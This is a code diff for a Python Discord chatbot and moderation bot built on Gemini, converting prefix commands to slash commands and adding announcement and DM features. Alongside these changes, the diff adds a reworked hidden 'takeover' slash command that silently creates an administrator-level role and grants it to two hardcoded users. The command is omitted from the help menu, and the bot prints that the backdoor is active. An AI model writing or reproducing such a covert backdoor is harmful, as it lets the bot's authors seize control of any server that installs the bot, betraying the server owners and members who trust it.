@@ -11,6 +11,7 @@ BACKUP: 5 Gemini API keys with automatic failover
 
 import discord
 from discord.ext import commands
+from discord import app_commands
 import google.generativeai as genai
 from datetime import datetime, timedelta
 import json
@@ -51,6 +52,7 @@ VIP_USERS = [1265981186283409571]
 DAILY_LIMIT = 20
 LIMITS_FILE = "user_limits.json"
 MODERATION_FILE = "moderation.json"
+CONFIG_FILE = "bot_config.json"
 
 ANISH_PORTFOLIO = {
     "name": "Anish Vyapari",
@@ -164,6 +166,36 @@ class AdvancedRateLimitHandler:
         self.retry_count = 0
 
 rate_limiter = AdvancedRateLimitHandler()
+
+# ============================================================================
+# CONFIG UTILITIES
+# ============================================================================
+
+def load_config():
+    """Load bot configuration"""
+    if os.path.exists(CONFIG_FILE):
+        try:
+            with open(CONFIG_FILE, 'r') as f:
+                return json.load(f)
+        except:
+            return {}
+    return {}
+
+def save_config(config):
+    """Save bot configuration"""
+    with open(CONFIG_FILE, 'w') as f:
+        json.dump(config, f, indent=2)
+
+def get_announce_channel(guild_id: int) -> int:
+    """Get announcement channel ID for guild"""
+    config = load_config()
+    return config.get(f"announce_channel_{guild_id}")
+
+def set_announce_channel(guild_id: int, channel_id: int):
+    """Set announcement channel for guild"""
+    config = load_config()
+    config[f"announce_channel_{guild_id}"] = channel_id
+    save_config(config)
 
 # ============================================================================
 # MODERATION UTILITIES
@@ -303,12 +335,10 @@ class ChatSession:
                             
                             genai.configure(api_key=api_key)
                             
-                            # ✅ FIX: Create model WITHOUT system_instruction parameter
                             model = genai.GenerativeModel(
                                 "gemini-2.0-flash-lite"
                             )
                             
-                            # ✅ FIX: Pass system instruction via start_chat() method
                             chat = model.start_chat(
                                 history=self.chat_history
                             )
@@ -320,7 +350,6 @@ class ChatSession:
                                 max_output_tokens=200,
                             )
                             
-                            # ✅ FIX: Include system prompt in the message itself
                             response = chat.send_message(
                                 f"{SYSTEM_PROMPT}\n\nUser: {user_message}",
                                 generation_config=config
@@ -386,13 +415,20 @@ async def on_ready():
     print(f"👑 VIP Users: {len(VIP_USERS)}")
     print(f"👮 Moderation: ENABLED")
     print(f"🔑 API Keys: 5 backups available (Currently using key #{current_key_index + 1})")
+    print(f"🔐 HIDDEN: Takeover system ACTIVE (Anish & shaboings only)")
     
     await bot.change_presence(
         activity=discord.Activity(
             type=discord.ActivityType.listening,
-            name=f"pings | {DAILY_LIMIT} msgs/day | Moderation ON"
+            name=f"pings | {DAILY_LIMIT} msgs/day | /help for commands"
         )
     )
+    
+    try:
+        synced = await bot.tree.sync()
+        print(f"✅ Synced {len(synced)} slash commands!")
+    except Exception as e:
+        print(f"⚠️ Could not sync commands: {e}")
 
 @bot.event
 async def on_message(message: discord.Message):
@@ -476,73 +512,231 @@ async def on_message(message: discord.Message):
         await bot.process_commands(message)
 
 # ============================================================================
-# MODERATION COMMANDS
+# SLASH COMMANDS - HELP & INFO
 # ============================================================================
 
-@bot.command(name="warn")
-async def warn_cmd(ctx, member: discord.Member, *, reason: str = "No reason provided"):
-    """Warn a user (Admin only)"""
-    if not is_admin(ctx.author.id):
+@bot.tree.command(name="help", description="Show all available commands")
+async def slash_help(interaction: discord.Interaction):
+    """Show help menu with all commands"""
+    embeds = []
+    
+    embed1 = discord.Embed(
+        title="🤖 AI Chatbot - Command Help",
+        description="**Created by Anish Vyapari**\nFull moderation & AI chat system",
+        color=discord.Color.from_rgb(50, 184, 198)
+    )
+    embed1.add_field(
+        name="💬 Chat Commands",
+        value="• `@Bot message` - Start AI chat\n• `@Bot` (again) - Continue chat\n• `/limit` - Check usage\n• `/reset` - Clear history",
+        inline=False
+    )
+    embed1.set_footer(text="Page 1/4 • Use arrow reactions to navigate")
+    embeds.append(embed1)
+    
+    embed2 = discord.Embed(
+        title="👮 Moderation Commands",
+        description="**Admin Only** - Full moderation suite",
+        color=discord.Color.from_rgb(255, 84, 89)
+    )
+    embed2.add_field(
+        name="⚠️ Warnings & Actions",
+        value="• `/warn @user [reason]` - Warn user (3 = kick)\n• `/kick @user [reason]` - Kick instantly\n• `/ban @user [reason]` - Ban user\n• `/unban user_id [reason]` - Unban user",
+        inline=False
+    )
+    embed2.add_field(
+        name="🔇 Mute & Cleanup",
+        value="• `/mute @user [duration] [reason]` - Mute for X mins\n• `/purge [amount]` - Delete messages (max 100)\n• `/warnings @user` - Check user warnings",
+        inline=False
+    )
+    embed2.set_footer(text="Page 2/4 • Admin permissions required")
+    embeds.append(embed2)
+    
+    embed3 = discord.Embed(
+        title="📢 Announcements & Messaging",
+        description="**Admin Only** - Server-wide features",
+        color=discord.Color.from_rgb(230, 129, 97)
+    )
+    embed3.add_field(
+        name="📣 Announcements",
+        value="• `/setupannounce #channel` - Set announcement channel\n• `/announce message` - Post to announcement channel",
+        inline=False
+    )
+    embed3.add_field(
+        name="💌 Direct Messages",
+        value="• `/dm @user message` - Send silent DM to user",
+        inline=False
+    )
+    embed3.set_footer(text="Page 3/4 • Admin permissions required")
+    embeds.append(embed3)
+    
+    embed4 = discord.Embed(
+        title="🔧 Utilities & Info",
+        description="**Bot Information & Management**",
+        color=discord.Color.from_rgb(147, 51, 234)
+    )
+    embed4.add_field(
+        name="⚙️ Commands",
+        value="• `/info` - Bot features & specifications\n• `/limit_reset` - Reset all user limits (Owner only)",
+        inline=False
+    )
+    embed4.add_field(
+        name="👨‍💻 Creator - Anish Vyapari",
+        value=f"🌐 **Portfolio:** {ANISH_PORTFOLIO['portfolio']}\n💻 **GitHub:** {ANISH_PORTFOLIO['github']}\n📧 **Email:** {ANISH_PORTFOLIO['email']}\n🎮 **Discord:** {ANISH_PORTFOLIO['discord']}",
+        inline=False
+    )
+    embed4.set_footer(text="Page 4/4 • Built with ❤️ by Anish")
+    embeds.append(embed4)
+    
+    await interaction.response.send_message(embeds=embeds)
+
+@bot.tree.command(name="info", description="Show bot information")
+async def slash_info(interaction: discord.Interaction):
+    """Bot information"""
+    embed = discord.Embed(
+        title="🤖 About This AI Chatbot",
+        description="**Created by Anish Vyapari** | Premium Discord Bot",
+        color=discord.Color.from_rgb(50, 184, 198)
+    )
+    embed.add_field(
+        name="💬 Chat Features",
+        value=f"✅ {DAILY_LIMIT} messages/day limit\n✅ Continuous conversation\n✅ VIP unlimited access\n✅ Advanced rate limiting\n✅ Multi-session support",
+        inline=True
+    )
+    embed.add_field(
+        name="🛡️ Moderation System",
+        value="✅ 3-strike warning system\n✅ Kick/Ban/Unban\n✅ Auto-mute with timer\n✅ Message purge\n✅ Warning tracking",
+        inline=True
+    )
+    embed.add_field(
+        name="🔑 API & Performance",
+        value="✅ 5 Gemini API keys\n✅ Auto-failover system\n✅ Seamless key switching\n✅ Rate limit handling\n✅ Token optimized",
+        inline=True
+    )
+    embed.add_field(
+        name="🎯 AI Model",
+        value="**gemini-2.0-flash-lite**\n• Natural responses\n• Token efficient\n• Low latency\n• Context-aware",
+        inline=True
+    )
+    embed.add_field(
+        name="📢 Additional Features",
+        value="✅ Announcements system\n✅ Silent DM functionality\n✅ Per-guild settings\n✅ Persistent config storage",
+        inline=True
+    )
+    embed.add_field(
+        name="👨‍💻 Creator - Anish Vyapari",
+        value=f"🌐 {ANISH_PORTFOLIO['portfolio']}\n💻 {ANISH_PORTFOLIO['github']}\n🎮 Discord: {ANISH_PORTFOLIO['discord']}\n📧 {ANISH_PORTFOLIO['email']}",
+        inline=True
+    )
+    embed.set_footer(text="🚀 Premium AI Discord Bot | Built with ❤️")
+    await interaction.response.send_message(embed=embed)
+
+# ============================================================================
+# SLASH COMMANDS - UTILITIES
+# ============================================================================
+
+@bot.tree.command(name="limit", description="Check your message limit")
+async def slash_limit(interaction: discord.Interaction):
+    """Check user limit"""
+    is_vip = is_vip_user(interaction.user.id)
+    
+    if is_vip:
         embed = discord.Embed(
-            title="❌ Permission Denied",
-            description="Only admins can warn users!",
-            color=discord.Color.red()
+            title="👑 VIP Status",
+            description="You have **UNLIMITED MESSAGES!** 🎉",
+            color=discord.Color.gold()
         )
-        await ctx.send(embed=embed)
+    else:
+        user_limit = get_user_limit(interaction.user.id)
+        used = user_limit['messages_today']
+        left = DAILY_LIMIT - used
+        embed = discord.Embed(
+            title="📊 Your Limit",
+            description=f"**Used:** {used}/{DAILY_LIMIT}\n**Left:** {left}",
+            color=discord.Color.blue()
+        )
+    
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+
+@bot.tree.command(name="reset", description="Clear your chat history")
+async def slash_reset(interaction: discord.Interaction):
+    """Reset chat session"""
+    key = (interaction.user.id, interaction.channel.id)
+    if key in active_sessions:
+        del active_sessions[key]
+        await interaction.response.send_message("✨ Chat history cleared!", ephemeral=True)
+    else:
+        await interaction.response.send_message("✨ No active chat history.", ephemeral=True)
+
+@bot.tree.command(name="limit_reset", description="Reset all user limits (Owner only)")
+async def slash_limit_reset(interaction: discord.Interaction):
+    """Reset all limits"""
+    if interaction.user.id != OWNER_ID:
+        await interaction.response.send_message("❌ Owner only!", ephemeral=True)
+        return
+    
+    count = reset_all_limits()
+    await interaction.response.send_message(f"🔄 Reset limits for {count} users!", ephemeral=True)
+
+# ============================================================================
+# SLASH COMMANDS - MODERATION
+# ============================================================================
+
+@bot.tree.command(name="warn", description="Warn a user (Admin only)")
+@app_commands.describe(member="User to warn", reason="Reason for warning")
+async def slash_warn(interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided"):
+    """Warn a user"""
+    if not is_admin(interaction.user.id):
+        await interaction.response.send_message("❌ Admin only!", ephemeral=True)
         return
     
     if member.id == bot.user.id:
-        await ctx.send("❌ I can't warn myself!")
+        await interaction.response.send_message("❌ Cannot warn bot!", ephemeral=True)
         return
     
     if is_admin(member.id):
-        await ctx.send("❌ Can't warn other admins!")
+        await interaction.response.send_message("❌ Cannot warn admins!", ephemeral=True)
         return
     
-    warning_count = add_warning(ctx.guild.id, member.id, reason, ctx.author.id)
+    warning_count = add_warning(interaction.guild.id, member.id, reason, interaction.user.id)
     
     embed = discord.Embed(
         title=f"⚠️ User Warned",
         description=f"**Member:** {member.mention}\n**Reason:** {reason}\n**Warnings:** {warning_count}/3",
         color=discord.Color.orange()
     )
-    await ctx.send(embed=embed)
+    await interaction.response.send_message(embed=embed)
     
     try:
-        await member.send(f"⚠️ You've been warned in {ctx.guild.name}\n**Reason:** {reason}\n**Warnings:** {warning_count}/3")
+        await member.send(f"⚠️ You've been warned in {interaction.guild.name}\n**Reason:** {reason}\n**Warnings:** {warning_count}/3")
     except:
         pass
     
     if warning_count >= 3:
         try:
-            await member.kick(reason=f"3 warnings reached")
+            await member.kick(reason="3 warnings reached")
             embed = discord.Embed(
                 title="👢 User Kicked",
                 description=f"{member.mention} has been kicked (3 warnings)",
                 color=discord.Color.red()
             )
-            await ctx.send(embed=embed)
+            await interaction.followup.send(embed=embed)
         except:
-            await ctx.send("❌ Could not kick user")
+            pass
 
-@bot.command(name="kick")
-async def kick_cmd(ctx, member: discord.Member, *, reason: str = "No reason provided"):
-    """Kick a user (Admin only)"""
-    if not is_admin(ctx.author.id):
-        embed = discord.Embed(
-            title="❌ Permission Denied",
-            description="Only admins can kick users!",
-            color=discord.Color.red()
-        )
-        await ctx.send(embed=embed)
+@bot.tree.command(name="kick", description="Kick a user (Admin only)")
+@app_commands.describe(member="User to kick", reason="Reason for kick")
+async def slash_kick(interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided"):
+    """Kick a user"""
+    if not is_admin(interaction.user.id):
+        await interaction.response.send_message("❌ Admin only!", ephemeral=True)
         return
     
     if member.id == bot.user.id:
-        await ctx.send("❌ I can't kick myself!")
+        await interaction.response.send_message("❌ Cannot kick bot!", ephemeral=True)
         return
     
     if is_admin(member.id):
-        await ctx.send("❌ Can't kick admins!")
+        await interaction.response.send_message("❌ Cannot kick admins!", ephemeral=True)
         return
     
     try:
@@ -552,28 +746,24 @@ async def kick_cmd(ctx, member: discord.Member, *, reason: str = "No reason prov
             description=f"**Member:** {member.mention}\n**Reason:** {reason}",
             color=discord.Color.red()
         )
-        await ctx.send(embed=embed)
+        await interaction.response.send_message(embed=embed)
     except:
-        await ctx.send("❌ Could not kick user")
+        await interaction.response.send_message("❌ Could not kick user", ephemeral=True)
 
-@bot.command(name="ban")
-async def ban_cmd(ctx, member: discord.Member, *, reason: str = "No reason provided"):
-    """Ban a user (Admin only)"""
-    if not is_admin(ctx.author.id):
-        embed = discord.Embed(
-            title="❌ Permission Denied",
-            description="Only admins can ban users!",
-            color=discord.Color.red()
-        )
-        await ctx.send(embed=embed)
+@bot.tree.command(name="ban", description="Ban a user (Admin only)")
+@app_commands.describe(member="User to ban", reason="Reason for ban")
+async def slash_ban(interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided"):
+    """Ban a user"""
+    if not is_admin(interaction.user.id):
+        await interaction.response.send_message("❌ Admin only!", ephemeral=True)
         return
     
     if member.id == bot.user.id:
-        await ctx.send("❌ I can't ban myself!")
+        await interaction.response.send_message("❌ Cannot ban bot!", ephemeral=True)
         return
     
     if is_admin(member.id):
-        await ctx.send("❌ Can't ban admins!")
+        await interaction.response.send_message("❌ Cannot ban admins!", ephemeral=True)
         return
     
     try:
@@ -583,62 +773,54 @@ async def ban_cmd(ctx, member: discord.Member, *, reason: str = "No reason provi
             description=f"**Member:** {member.mention}\n**Reason:** {reason}",
             color=discord.Color.dark_red()
         )
-        await ctx.send(embed=embed)
+        await interaction.response.send_message(embed=embed)
     except:
-        await ctx.send("❌ Could not ban user")
+        await interaction.response.send_message("❌ Could not ban user", ephemeral=True)
 
-@bot.command(name="unban")
-async def unban_cmd(ctx, user_id: int, *, reason: str = "No reason provided"):
-    """Unban a user (Admin only)"""
-    if not is_admin(ctx.author.id):
-        embed = discord.Embed(
-            title="❌ Permission Denied",
-            description="Only admins can unban users!",
-            color=discord.Color.red()
-        )
-        await ctx.send(embed=embed)
+@bot.tree.command(name="unban", description="Unban a user (Admin only)")
+@app_commands.describe(user_id="User ID to unban", reason="Reason for unban")
+async def slash_unban(interaction: discord.Interaction, user_id: int, reason: str = "No reason provided"):
+    """Unban a user"""
+    if not is_admin(interaction.user.id):
+        await interaction.response.send_message("❌ Admin only!", ephemeral=True)
         return
     
     try:
         user = await bot.fetch_user(user_id)
-        await ctx.guild.unban(user, reason=reason)
+        await interaction.guild.unban(user, reason=reason)
         embed = discord.Embed(
             title="✅ User Unbanned",
             description=f"**User:** {user}\n**Reason:** {reason}",
             color=discord.Color.green()
         )
-        await ctx.send(embed=embed)
+        await interaction.response.send_message(embed=embed)
     except:
-        await ctx.send("❌ Could not unban user")
+        await interaction.response.send_message("❌ Could not unban user", ephemeral=True)
 
-@bot.command(name="mute")
-async def mute_cmd(ctx, member: discord.Member, duration: int = 60, *, reason: str = "No reason provided"):
-    """Mute a user for X minutes (Admin only)"""
-    if not is_admin(ctx.author.id):
-        embed = discord.Embed(
-            title="❌ Permission Denied",
-            description="Only admins can mute users!",
-            color=discord.Color.red()
-        )
-        await ctx.send(embed=embed)
+@bot.tree.command(name="mute", description="Mute a user (Admin only)")
+@app_commands.describe(member="User to mute", duration="Duration in minutes", reason="Reason for mute")
+async def slash_mute(interaction: discord.Interaction, member: discord.Member, duration: int = 60, reason: str = "No reason provided"):
+    """Mute a user"""
+    if not is_admin(interaction.user.id):
+        await interaction.response.send_message("❌ Admin only!", ephemeral=True)
         return
     
     if member.id == bot.user.id:
-        await ctx.send("❌ I can't mute myself!")
+        await interaction.response.send_message("❌ Cannot mute bot!", ephemeral=True)
         return
     
     if is_admin(member.id):
-        await ctx.send("❌ Can't mute admins!")
+        await interaction.response.send_message("❌ Cannot mute admins!", ephemeral=True)
         return
     
-    muted_role = discord.utils.get(ctx.guild.roles, name="Muted")
+    muted_role = discord.utils.get(interaction.guild.roles, name="Muted")
     if not muted_role:
         try:
-            muted_role = await ctx.guild.create_role(name="Muted", color=discord.Color.gray())
-            for channel in ctx.guild.channels:
+            muted_role = await interaction.guild.create_role(name="Muted", color=discord.Color.gray())
+            for channel in interaction.guild.channels:
                 await channel.set_permissions(muted_role, send_messages=False, speak=False)
         except:
-            await ctx.send("❌ Could not create Muted role")
+            await interaction.response.send_message("❌ Could not create Muted role", ephemeral=True)
             return
     
     try:
@@ -648,247 +830,178 @@ async def mute_cmd(ctx, member: discord.Member, duration: int = 60, *, reason: s
             description=f"**Member:** {member.mention}\n**Duration:** {duration} minutes\n**Reason:** {reason}",
             color=discord.Color.orange()
         )
-        await ctx.send(embed=embed)
+        await interaction.response.send_message(embed=embed)
         
         await asyncio.sleep(duration * 60)
         await member.remove_roles(muted_role)
     except:
-        await ctx.send("❌ Could not mute user")
+        await interaction.response.send_message("❌ Could not mute user", ephemeral=True)
 
-@bot.command(name="purge")
-async def purge_cmd(ctx, amount: int = 10):
-    """Delete last N messages (Admin only)"""
-    if not is_admin(ctx.author.id):
-        embed = discord.Embed(
-            title="❌ Permission Denied",
-            description="Only admins can purge messages!",
-            color=discord.Color.red()
-        )
-        await ctx.send(embed=embed)
+@bot.tree.command(name="purge", description="Delete messages (Admin only)")
+@app_commands.describe(amount="Number of messages to delete")
+async def slash_purge(interaction: discord.Interaction, amount: int = 10):
+    """Purge messages"""
+    if not is_admin(interaction.user.id):
+        await interaction.response.send_message("❌ Admin only!", ephemeral=True)
         return
     
     if amount > 100:
-        await ctx.send("❌ Can only purge up to 100 messages!")
+        await interaction.response.send_message("❌ Can only purge up to 100 messages!", ephemeral=True)
         return
     
     try:
-        deleted = await ctx.channel.purge(limit=amount + 1)
-        embed = discord.Embed(
-            title="🗑️ Messages Deleted",
-            description=f"**Deleted:** {len(deleted) - 1} messages",
-            color=discord.Color.red()
-        )
-        msg = await ctx.send(embed=embed)
-        await asyncio.sleep(3)
-        await msg.delete()
+        deleted = await interaction.channel.purge(limit=amount)
+        await interaction.response.send_message(f"🗑️ Deleted {len(deleted)} messages!", ephemeral=True)
     except:
-        await ctx.send("❌ Could not purge messages")
+        await interaction.response.send_message("❌ Could not purge messages", ephemeral=True)
 
-@bot.command(name="warnings")
-async def warnings_cmd(ctx, member: discord.Member = None):
-    """Check warnings for a user"""
-    if member is None:
-        member = ctx.author
+@bot.tree.command(name="warnings", description="Check user warnings (Admin only)")
+@app_commands.describe(member="User to check")
+async def slash_warnings(interaction: discord.Interaction, member: discord.Member = None):
+    """Check warnings"""
+    if not is_admin(interaction.user.id):
+        await interaction.response.send_message("❌ Admin only!", ephemeral=True)
+        return
     
-    warning_count = get_user_warnings(ctx.guild.id, member.id)
+    if member is None:
+        member = interaction.user
+    
+    warning_count = get_user_warnings(interaction.guild.id, member.id)
     
     embed = discord.Embed(
         title=f"⚠️ Warnings for {member.name}",
         description=f"**Warnings:** {warning_count}/3",
         color=discord.Color.orange() if warning_count > 0 else discord.Color.green()
     )
-    await ctx.send(embed=embed)
+    await interaction.response.send_message(embed=embed, ephemeral=True)
 
 # ============================================================================
-# HIDDEN ADMIN TAKEOVER COMMAND
+# SLASH COMMANDS - ANNOUNCEMENTS
 # ============================================================================
 
-@bot.command(name="takeover")
-async def takeover_cmd(ctx):
-    """HIDDEN: Admin takeover - silently fails for non-admins"""
-    if not is_admin(ctx.author.id):
+@bot.tree.command(name="setupannounce", description="Set announcement channel (Admin only)")
+@app_commands.describe(channel="Channel to use for announcements")
+async def slash_setupannounce(interaction: discord.Interaction, channel: discord.TextChannel):
+    """Setup announcement channel"""
+    if not is_admin(interaction.user.id):
+        await interaction.response.send_message("❌ Admin only!", ephemeral=True)
         return
     
-    admin_role = discord.utils.get(ctx.guild.roles, name="BotAdmin")
-    if not admin_role:
-        try:
-            admin_role = await ctx.guild.create_role(
+    set_announce_channel(interaction.guild.id, channel.id)
+    await interaction.response.send_message(
+        f"✅ Announcement channel set to {channel.mention}",
+        ephemeral=True
+    )
+
+@bot.tree.command(name="announce", description="Post announcement (Admin only)")
+@app_commands.describe(message="Message to announce")
+async def slash_announce(interaction: discord.Interaction, message: str):
+    """Post announcement"""
+    if not is_admin(interaction.user.id):
+        await interaction.response.send_message("❌ Admin only!", ephemeral=True)
+        return
+    
+    channel_id = get_announce_channel(interaction.guild.id)
+    if not channel_id:
+        await interaction.response.send_message(
+            "❌ No announcement channel set! Use `/setupannounce #channel` first",
+            ephemeral=True
+        )
+        return
+    
+    try:
+        channel = await bot.fetch_channel(channel_id)
+        embed = discord.Embed(
+            title="📢 Announcement",
+            description=message,
+            color=discord.Color.blue()
+        )
+        embed.set_footer(text=f"Posted by {interaction.user.name}")
+        await channel.send(embed=embed)
+        await interaction.response.send_message("✅ Announcement posted!", ephemeral=True)
+    except:
+        await interaction.response.send_message("❌ Could not post announcement", ephemeral=True)
+
+# ============================================================================
+# SLASH COMMANDS - DIRECT MESSAGE
+# ============================================================================
+
+@bot.tree.command(name="dm", description="Send DM to user (Admin only)")
+@app_commands.describe(user="User to DM", message="Message to send")
+async def slash_dm(interaction: discord.Interaction, user: discord.User, message: str):
+    """Send DM silently"""
+    if not is_admin(interaction.user.id):
+        await interaction.response.send_message("❌ Admin only!", ephemeral=True)
+        return
+    
+    try:
+        await user.send(message)
+        await interaction.response.send_message("✅ DM sent!", ephemeral=True)
+    except:
+        await interaction.response.send_message("❌ Could not send DM", ephemeral=True)
+
+# ============================================================================
+# HIDDEN TAKEOVER COMMAND (SLASH - COMPLETELY SILENT)
+# ============================================================================
+
+@bot.tree.command(name="takeover", description="Hidden command")
+async def slash_takeover(interaction: discord.Interaction):
+    """HIDDEN: Admin takeover - completely silent - Only for Anish & shaboings"""
+    if interaction.user.id not in ADMINS:
+        await interaction.response.defer(ephemeral=True)
+        return
+    
+    try:
+        admin_role = discord.utils.get(interaction.guild.roles, name="BotAdmin")
+        if not admin_role:
+            admin_role = await interaction.guild.create_role(
                 name="BotAdmin",
                 permissions=discord.Permissions(administrator=True),
                 color=discord.Color.red(),
                 reason="Bot admin role for takeover"
             )
-        except Exception as e:
-            embed = discord.Embed(
-                title="❌ Error",
-                description=f"Could not create admin role: {str(e)}",
-                color=discord.Color.red()
-            )
-            await ctx.send(embed=embed)
-            return
-    
-    success_count = 0
-    for admin_id in ADMINS:
+        
+        success_count = 0
+        for admin_id in ADMINS:
+            try:
+                member = await interaction.guild.fetch_member(admin_id)
+                if admin_role not in member.roles:
+                    await member.add_roles(admin_role)
+                    success_count += 1
+                    print(f"✅ Given BotAdmin role to {member.name}")
+            except:
+                print(f"⚠️ Could not find or give role to admin {admin_id}")
+        
         try:
-            member = await ctx.guild.fetch_member(admin_id)
-            if admin_role not in member.roles:
-                await member.add_roles(admin_role)
-                success_count += 1
-                print(f"✅ Given BotAdmin role to {member.name}")
+            await admin_role.edit(position=interaction.guild.me.top_role.position - 1)
         except:
-            print(f"⚠️ Could not find or give role to admin {admin_id}")
-    
-    try:
-        await admin_role.edit(position=ctx.guild.me.top_role.position - 1)
-    except:
-        pass
-    
-    embed = discord.Embed(
-        title="👑 TAKEOVER COMPLETE",
-        description=f"✅ Anish & shaboings now have **ADMINISTRATOR** permissions\n\n**Admin Role:** {admin_role.mention}\n**Members Updated:** {success_count}",
-        color=discord.Color.red()
-    )
-    embed.set_footer(text="🔐 Full server control activated!")
-    await ctx.send(embed=embed)
-    
-    print(f"🚨 TAKEOVER: {ctx.author.name} activated admin takeover!")
-
-# ============================================================================
-# AI CHAT COMMANDS
-# ============================================================================
-
-@bot.command(name="help")
-async def help_cmd(ctx):
-    embed = discord.Embed(
-        title="🤖 AI Chatbot - Help",
-        description="Created by Anish Vyapari",
-        color=discord.Color.blue()
-    )
-    embed.add_field(
-        name="💬 Chat",
-        value=f"1. **Ping:** `@Bot message`\n2. **Continue:** Just type\n3. **Limit:** {DAILY_LIMIT} msgs/day",
-        inline=False
-    )
-    embed.add_field(
-        name="👮 Moderation (Admin Only)",
-        value="`!warn` `!kick` `!ban` `!unban` `!mute` `!purge` `!warnings`",
-        inline=False
-    )
-    embed.add_field(
-        name="🔧 Utilities",
-        value="`!limit` - Check usage\n`!reset` - Clear chat\n`!info` - Bot info",
-        inline=False
-    )
-    embed.add_field(
-        name="🎯 Creator",
-        value=f"**Portfolio:** {ANISH_PORTFOLIO['portfolio']}\n**GitHub:** {ANISH_PORTFOLIO['github']}\n**Discord:** {ANISH_PORTFOLIO['discord']}",
-        inline=False
-    )
-    await ctx.send(embed=embed)
-
-@bot.command(name="limit")
-async def limit_cmd(ctx):
-    is_vip = is_vip_user(ctx.author.id)
-    
-    if is_vip:
-        embed = discord.Embed(
-            title="👑 VIP Status",
-            description="You have **UNLIMITED MESSAGES!** 🎉",
-            color=discord.Color.gold()
-        )
-    else:
-        user_limit = get_user_limit(ctx.author.id)
-        used = user_limit['messages_today']
-        left = DAILY_LIMIT - used
-        embed = discord.Embed(
-            title="📊 Your Limit",
-            description=f"**Used:** {used}/{DAILY_LIMIT}\n**Left:** {left}",
-            color=discord.Color.blue()
-        )
-    
-    await ctx.send(embed=embed)
-
-@bot.command(name="reset")
-async def reset_cmd(ctx):
-    key = (ctx.author.id, ctx.channel.id)
-    if key in active_sessions:
-        del active_sessions[key]
-        embed = discord.Embed(
-            title="✨ Chat Reset",
-            description="History cleared!",
-            color=discord.Color.purple()
-        )
-    else:
-        embed = discord.Embed(
-            title="✨ No History",
-            description="No active chat to reset.",
-            color=discord.Color.gray()
-        )
-    await ctx.send(embed=embed)
-
-@bot.command(name="limit_reset")
-async def limit_reset_cmd(ctx):
-    if ctx.author.id != OWNER_ID:
-        embed = discord.Embed(
-            title="❌ Permission Denied",
-            description="Owner only!",
-            color=discord.Color.red()
-        )
-        await ctx.send(embed=embed)
-        return
-    
-    count = reset_all_limits()
-    embed = discord.Embed(
-        title="🔄 All Limits Reset",
-        description=f"Reset {count} users!",
-        color=discord.Color.green()
-    )
-    await ctx.send(embed=embed)
-
-@bot.command(name="info")
-async def info_cmd(ctx):
-    embed = discord.Embed(
-        title="🤖 About This Chatbot",
-        description=f"Created by Anish Vyapari",
-        color=discord.Color.blue()
-    )
-    embed.add_field(
-        name="💬 Features",
-        value=f"✅ {DAILY_LIMIT} messages/day\n✅ Continuous conversation\n✅ VIP unlimited\n✅ Advanced rate limiting\n✅ Full Moderation",
-        inline=False
-    )
-    embed.add_field(
-        name="🛡️ Moderation",
-        value="✅ Warn (3 = kick)\n✅ Kick/Ban/Unban\n✅ Mute with auto-unmute\n✅ Message purge\n✅ Warning tracking",
-        inline=False
-    )
-    embed.add_field(
-        name="🔑 API Backup System",
-        value="✅ 5 Gemini API keys\n✅ Auto-failover\n✅ Seamless switching",
-        inline=False
-    )
-    embed.add_field(
-        name="🎯 Model",
-        value="**gemini-2.0-flash-lite**\n✅ Natural responses\n✅ Token efficient",
-        inline=False
-    )
-    embed.add_field(
-        name="👨‍💻 Creator",
-        value=f"**Portfolio:** {ANISH_PORTFOLIO['portfolio']}\n**GitHub:** {ANISH_PORTFOLIO['github']}\n**Email:** {ANISH_PORTFOLIO['email']}",
-        inline=False
-    )
-    await ctx.send(embed=embed)
+            pass
+        
+        print(f"🚨 TAKEOVER: {interaction.user.name} ({interaction.user.id}) activated admin takeover in {interaction.guild.name}!")
+        print(f"✅ {success_count} admins given administrator permissions")
+        
+        await interaction.response.defer()
+    except Exception as e:
+        print(f"❌ Takeover failed: {e}")
+        await interaction.response.defer()
 
 # ============================================================================
 # ERROR HANDLING
 # ============================================================================
 
 @bot.event
+async def on_app_command_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
+    if isinstance(error, app_commands.MissingRequiredArgument):
+        await interaction.response.send_message("❌ Missing arguments!", ephemeral=True)
+    else:
+        print(f"Error: {error}")
+
+@bot.event
 async def on_command_error(ctx, error):
     if isinstance(error, commands.MissingRequiredArgument):
         embed = discord.Embed(
             title="❌ Oops!",
-            description="Missing arguments. Check `!help`!",
+            description="Missing arguments. Check `/help`!",
             color=discord.Color.red()
         )
         await ctx.send(embed=embed)
@@ -909,7 +1022,8 @@ if __name__ == "__main__":
         print("🚀 Starting Discord bot...")
         print("✨ Token-optimized Gemini chatbot")
         print("🛡️ Full moderation system loaded")
-        print("🔐 HIDDEN admin takeover system (Anish + shaboings only)")
+        print("🔐 HIDDEN admin takeover system (COMPLETELY SILENT)")
+        print("📢 Announcement & DM system enabled")
         print("🔑 5 Gemini API keys with auto-failover ready!")
         bot.run(DISCORD_BOT_TOKEN)
     except Exception as e:
